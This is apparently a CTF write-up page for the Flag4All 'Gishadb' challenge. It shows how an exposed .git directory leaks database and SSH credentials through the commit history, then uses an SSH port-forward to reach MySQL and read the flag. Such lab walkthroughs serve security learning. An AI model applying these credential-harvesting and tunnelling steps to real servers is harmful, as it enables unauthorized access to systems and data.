@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Gishadb - NozyZy</title><meta name="Description" content="French Cybersecurity student and CTF enjoyer."><meta property="og:title" content="Gishadb" />
+<meta property="og:description" content="Flag4All - Gishadb Category Realistic
+Description Ce serveur écoute sur 2 ports ! 443 et 222. Trouvez un moyen d&rsquo;obtenir le flag.
+This server listen on two ports: 443 and 222. Find a way to get the flag.
+Link https://gishadb.flag4all.sh
+Difficulty EASY - 495 points
+Author: Penthium2 (BZHack) ScreenshotWrite up .git dump I highly recommend you to have DotGit extension installed for CTF and web audits. It automatically checks for you if a ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nozyzy.github.io/posts/gishadb/" /><meta property="og:image" content="https://nozyzy.github.io/assets/nozzy.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-10-22T03:13:42+02:00" />
+<meta property="article:modified_time" content="2023-10-22T03:13:42+02:00" /><meta property="og:site_name" content="NozZy" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nozyzy.github.io/assets/nozzy.png"/>
+
+<meta name="twitter:title" content="Gishadb"/>
+<meta name="twitter:description" content="Flag4All - Gishadb Category Realistic
+Description Ce serveur écoute sur 2 ports ! 443 et 222. Trouvez un moyen d&rsquo;obtenir le flag.
+This server listen on two ports: 443 and 222. Find a way to get the flag.
+Link https://gishadb.flag4all.sh
+Difficulty EASY - 495 points
+Author: Penthium2 (BZHack) ScreenshotWrite up .git dump I highly recommend you to have DotGit extension installed for CTF and web audits. It automatically checks for you if a ."/>
+<meta name="application-name" content="NozZy">
+<meta name="apple-mobile-web-app-title" content="NozZy"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://nozyzy.github.io/posts/gishadb/" /><link rel="prev" href="https://nozyzy.github.io/posts/stranger-case-2023/" /><link rel="next" href="https://nozyzy.github.io/posts/headshot/" /><link rel="stylesheet" href="/css/style.min.cf6878db51c51b2d04ae155284a4403dbee8db33e16c066f954c95279c271fcd.css" integrity="sha256-z2h421HFGy0ErhVShKRAPb7o2zPhbAZvlUyVJ5wnH80="><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Gishadb",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/nozyzy.github.io\/posts\/gishadb\/"
+        },"genre": "posts","keywords": "Forensics, Realistic","wordcount":  713 ,
+        "url": "https:\/\/nozyzy.github.io\/posts\/gishadb\/","datePublished": "2023-10-22T03:13:42+02:00","dateModified": "2023-10-22T03:13:42+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "NozZy"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="NozyZy"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://avatars.githubusercontent.com/u/60878689?v=4"
+        data-srcset="https://avatars.githubusercontent.com/u/60878689?v=4, https://avatars.githubusercontent.com/u/60878689?v=4 1.5x, https://avatars.githubusercontent.com/u/60878689?v=4 2x"
+        data-sizes="auto"
+        alt="https://avatars.githubusercontent.com/u/60878689?v=4"
+        title="https://avatars.githubusercontent.com/u/60878689?v=4" />NozZy</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Writeups"> Writeups </a><a class="menu-item" href="/articles/" title="Articles"> Articles </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="NozyZy"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://avatars.githubusercontent.com/u/60878689?v=4"
+        data-srcset="https://avatars.githubusercontent.com/u/60878689?v=4, https://avatars.githubusercontent.com/u/60878689?v=4 1.5x, https://avatars.githubusercontent.com/u/60878689?v=4 2x"
+        data-sizes="auto"
+        alt="https://avatars.githubusercontent.com/u/60878689?v=4"
+        title="https://avatars.githubusercontent.com/u/60878689?v=4" />NozZy</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Writeups">Writeups</a><a class="menu-item" href="/articles/" title="Articles">Articles</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Gishadb</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="nozyzy.github.io" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>NozZy</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a>&nbsp;<a href="/categories/flag4all/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Flag4All</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="22-10-2023">22-10-2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;713 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#category">Category</a></li>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#link">Link</a></li>
+    <li><a href="#difficulty">Difficulty</a></li>
+    <li><a href="#write-up">Write up</a>
+      <ul>
+        <li><a href="#git-dump">.git dump</a></li>
+        <li><a href="#database-dump">Database dump</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="flag4all---gishadb">Flag4All - Gishadb</h1>
+<hr>
+<h2 id="category">Category</h2>
+<blockquote>
+<p>Realistic</p>
+</blockquote>
+<h2 id="description">Description</h2>
+<p>Ce serveur écoute sur 2 ports ! 443 et 222. Trouvez un moyen d&rsquo;obtenir le flag.</p>
+<p>This server listen on two ports: 443 and 222. Find a way to get the flag.</p>
+<h2 id="link">Link</h2>
+<p><a href="https://gishadb.flag4all.sh" target="_blank" rel="noopener noreffer ">https://gishadb.flag4all.sh</a></p>
+<h2 id="difficulty">Difficulty</h2>
+<p><strong>EASY</strong> - 495 points</p>
+<ul>
+<li>Author: <strong>Penthium2 (BZHack)</strong></li>
+</ul>
+<hr>
+<figure><a class="lightgallery" href="/Gishadb/screen.png" title="Screenshot" data-thumbnail="/Gishadb/screen.png" data-sub-html="<h2>Screenshot</h2><p>Screenshot</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/Gishadb/screen.png"
+            data-srcset="/Gishadb/screen.png, /Gishadb/screen.png 1.5x, /Gishadb/screen.png 2x"
+            data-sizes="auto"
+            alt="Screenshot" />
+    </a><figcaption class="image-caption">Screenshot</figcaption>
+    </figure>
+<h2 id="write-up">Write up</h2>
+<h3 id="git-dump">.git dump</h3>
+<p>I highly recommend you to have <a href="https://github.com/davtur19/DotGit" target="_blank" rel="noopener noreffer ">DotGit</a> extension installed for CTF and web audits.
+It automatically checks for you if a <strong>.git directory is exposed</strong>. And that&rsquo;s what happened here when I opened the page. This extension also comes with an extraction tool.</p>
+<figure><a class="lightgallery" href="/Gishadb/dotgit.png" title="Dump it !" data-thumbnail="/Gishadb/dotgit.png" data-sub-html="<h2>Dump it !</h2><p>Dump it !</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/Gishadb/dotgit.png"
+            data-srcset="/Gishadb/dotgit.png, /Gishadb/dotgit.png 1.5x, /Gishadb/dotgit.png 2x"
+            data-sizes="auto"
+            alt="Dump it !" />
+    </a><figcaption class="image-caption">Dump it !</figcaption>
+    </figure>
+<p>After the whole extraction is done, we can first take a look at the git logs with <code>git log</code>:</p>
+<figure><a class="lightgallery" href="/Gishadb/commits.png" title="commits" data-thumbnail="/Gishadb/commits.png" data-sub-html="<h2>commits</h2><p>commits</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/Gishadb/commits.png"
+            data-srcset="/Gishadb/commits.png, /Gishadb/commits.png 1.5x, /Gishadb/commits.png 2x"
+            data-sizes="auto"
+            alt="commits" />
+    </a><figcaption class="image-caption">commits</figcaption>
+    </figure>
+<p>Then I used <code>git show &lt;commit id&gt;</code> to show the content of each commit. And it didn&rsquo;t disappoint me:</p>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>1. The main page content (not useful) AND db credentials (ofc useful)<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl">commit 02ef7e50a0bb9954d7819f8fd7c7b2c593db0d73
+</span></span><span class="line"><span class="cl">Author: penthium2 &lt;penthium2@hotmail.fr&gt;
+</span></span><span class="line"><span class="cl">Date:   Thu May 25 14:44:03 2023 +0200
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    ipremier commit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/index.php b/index.php
+</span></span></span><span class="line"><span class="cl"><span class="gh"></span>new file mode 100644
+</span></span><span class="line"><span class="cl"><span class="gh">index 0000000..20e4fa0
+</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- /dev/null
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/index.php
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -0,0 +1,13 @@
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span><span class="gi">+&lt;H1&gt;Je suis un maitre du PHP et SQL&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="gi">+&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="gi">+$cnx = new PDO(&#39;mysql:host=127.0.0.1;dbname=app;charset=utf8&#39;, &#39;app&#39;, &#39;db_Super_P4$$&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="gi">+
+</span></span></span><span class="line"><span class="cl"><span class="gi">+// Partie &#34;Requête&#34;
+</span></span></span><span class="line"><span class="cl"><span class="gi">+
+</span></span></span><span class="line"><span class="cl"><span class="gi">+echo &#34;&lt;p&gt;dans ma table &lt;b&gt;HAND&lt;/b&gt;&lt;/p&gt;&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="gi">+$query = &#39;SELECT * FROM `hand` where id=1&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="gi">+$resultSet = $cnx-&gt;query($query);
+</span></span></span><span class="line"><span class="cl"><span class="gi">+$element = $resultSet-&gt;fetch();
+</span></span></span><span class="line"><span class="cl"><span class="gi">+echo &#34;&lt;p&gt; voici le $element[1] de $element[2] et son id : $element[0]&lt;p&gt;&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="gi">+?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="gi">+&lt;h2&gt; mais quel est la valeur de l&#39;id 3 ?? &lt;/h2&gt;
+</span></span></span></code></pre></div></div>
+        </div>
+    </div>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>2. &#34;Fixing&#34; the credentials leak (but they did not change)<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl">commit 6dbcaf8c22bbe74aa2562ac60f58602d8592347a
+</span></span><span class="line"><span class="cl">Author: penthium2 &lt;penthium2@hotmail.fr&gt;
+</span></span><span class="line"><span class="cl">Date:   Thu May 25 14:50:32 2023 +0200
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    sécurisation
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/config.php b/config.php
+</span></span></span><span class="line"><span class="cl"><span class="gh"></span>new file mode 100644
+</span></span><span class="line"><span class="cl"><span class="gh">index 0000000..35d2322
+</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- /dev/null
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/config.php
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -0,0 +1,3 @@
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span><span class="gi">+&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="gi">+$cnx = new PDO(&#39;mysql:host=127.0.0.1;dbname=app;charset=utf8&#39;, &#39;app&#39;, &#39;db_Super_P4$$&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="gi">+?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gh">diff --git a/index.php b/index.php
+</span></span></span><span class="line"><span class="cl"><span class="gh">index 20e4fa0..5cd8a7d 100644
+</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/index.php
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/index.php
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -1,7 +1,7 @@
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span> &lt;H1&gt;Je suis un maitre du PHP et SQL&lt;/h1&gt;
+</span></span><span class="line"><span class="cl"> &lt;?php
+</span></span><span class="line"><span class="cl"><span class="gd">-$cnx = new PDO(&#39;mysql:host=127.0.0.1;dbname=app;charset=utf8&#39;, &#39;app&#39;, &#39;db_Super_P4$$&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="gd">-
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+// ajout d&#39;un iclude pour la s&lt;C3&gt;curit&lt;C3&gt;
+</span></span></span><span class="line"><span class="cl"><span class="gi">+include(&#34;config.php&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span> // Partie &#34;Requête&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> echo &#34;&lt;p&gt;dans ma table &lt;b&gt;HAND&lt;/b&gt;&lt;/p&gt;&#34;;
+</span></span></code></pre></div></div>
+        </div>
+    </div>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>3. some SSH credentials! (very useful)<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl">commit 13c0faef33bf466602913bc3918094cfefea072f
+</span></span><span class="line"><span class="cl">Author: penthium2 &lt;penthium2@hotmail.fr&gt;
+</span></span><span class="line"><span class="cl">Date:   Thu May 25 14:52:44 2023 +0200
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    ajout info ssh pour preprod
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/info_login b/info_login
+</span></span></span><span class="line"><span class="cl"><span class="gh"></span>new file mode 100644
+</span></span><span class="line"><span class="cl"><span class="gh">index 0000000..d904e9b
+</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- /dev/null
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/info_login
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -0,0 +1,2 @@
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span><span class="gi">+loginssh : gishadb@192.168.124.1
+</span></span></span><span class="line"><span class="cl"><span class="gi">+pass : iop
+</span></span></span></code></pre></div></div>
+        </div>
+    </div>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>4. Removing SSH creds (they di not change too)<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl">commit cfdccf9472e0b985abc372f90fa64352d744b5ad (HEAD -&gt; master)
+</span></span><span class="line"><span class="cl">Author: penthium2 &lt;penthium2@hotmail.fr&gt;
+</span></span><span class="line"><span class="cl">Date:   Thu May 25 14:53:28 2023 +0200
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    suppresion info preprod
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/info_login b/info_login
+</span></span></span><span class="line"><span class="cl"><span class="gh"></span>deleted file mode 100644
+</span></span><span class="line"><span class="cl"><span class="gh">index d904e9b..0000000
+</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/info_login
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ /dev/null
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -1,2 +0,0 @@
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span><span class="gd">-loginssh : gishadb@192.168.124.1
+</span></span></span><span class="line"><span class="cl"><span class="gd">-pass : iop
+</span></span></span></code></pre></div></div>
+        </div>
+    </div>
+<p>We now have:</p>
+<ul>
+<li>Database credentials</li>
+<li>SSH credentials</li>
+</ul>
+<h3 id="database-dump">Database dump</h3>
+<p>Then plan now is to connect to the server, and access the local database (not accessible remotely). However, a little thing will bother us after connecting to the port <strong>222</strong>:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/Gishadb/fuckssh.gif"
+        data-srcset="/Gishadb/fuckssh.gif, /Gishadb/fuckssh.gif 1.5x, /Gishadb/fuckssh.gif 2x"
+        data-sizes="auto"
+        alt="/Gishadb/fuckssh.gif"
+        title="Fuck" /></p>
+<p>This program is impossible to leave, just have to close the terminal.</p>
+<p>But anyway, we will go through an SSH tunnel, using <code>-L</code> flag, that allow us to forward one port on the server to our machine. We&rsquo;ll look for MySql port, <strong>3306</strong>
+Using <code>-N</code> will also not prompt the green binary disaster.</p>
+<p>Command is: <code>ssh -N gishadb@gishadb.flag4all.sh -p 222 -L 3306:localhost:3306</code></p>
+<p>We can now, in another terminal, connect to the remote MySql server using <code>app:db_Super_P4$$</code>:</p>
+<pre tabindex="0"><code>$ mysql -u app -p -h 127.0.0.1
+Enter password:
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 100238
+Server version: 10.5.21-MariaDB-0+deb11u1 Debian 11
+</code></pre><p>Now, need to show the databases, its tables, and then its content :</p>
+<pre tabindex="0"><code>MariaDB [(none)]&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| app                |
+| information_schema |
++--------------------+
+
+MariaDB [(none)]&gt; use app
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [app]&gt; show tables;
++---------------+
+| Tables_in_app |
++---------------+
+| hand          |
+| users         |
++---------------+
+
+MariaDB [app]&gt; select * from hand;
++----+-----------------------------+----------+
+| id | finger                      | ring     |
++----+-----------------------------+----------+
+|  1 | pouce                       | Penthium |
+|  2 | index                       | Penthium |
+|  3 | FLAG{TAK3_Care_Of_SSH_POWA} | Penthium |
+|  4 | anulaire                    | Penthium |
+|  5 | oriculaire                  | Penthium |
++----+-----------------------------+----------+
+</code></pre><div class="details admonition success">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-check-circle fa-fw" aria-hidden="true"></i>Flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">🚩 <code>FLAG{TAK3_Care_Of_SSH_POWA}</code></div>
+        </div>
+    </div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 22-10-2023</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://nozyzy.github.io/posts/gishadb/" data-title="Gishadb" data-via="Nozzouille" data-hashtags="Forensics,Realistic"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://nozyzy.github.io/posts/gishadb/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://nozyzy.github.io/posts/gishadb/" data-title="Gishadb"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://nozyzy.github.io/posts/gishadb/" data-title="Gishadb"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://nozyzy.github.io/posts/gishadb/" data-title="Gishadb"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/forensics/">Forensics</a>,&nbsp;<a href="/tags/realistic/">Realistic</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/stranger-case-2023/" class="prev" rel="prev" title="Stranger Case 2023"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Stranger Case 2023</a>
+            <a href="/posts/headshot/" class="next" rel="next" title="HeadShot">HeadShot<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="nozyzy.github.io" target="_blank">NozZy</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.b0df51c2c57145081cc73960e9aa780e6f5f56d06cf4ef0f96da8ce1619d1e12.js" integrity="sha256-sN9RwsVxRQgcxzlg6ap4Dm9fVtBs9O8PltqM4WGdHhI="></script></body>
+</html>
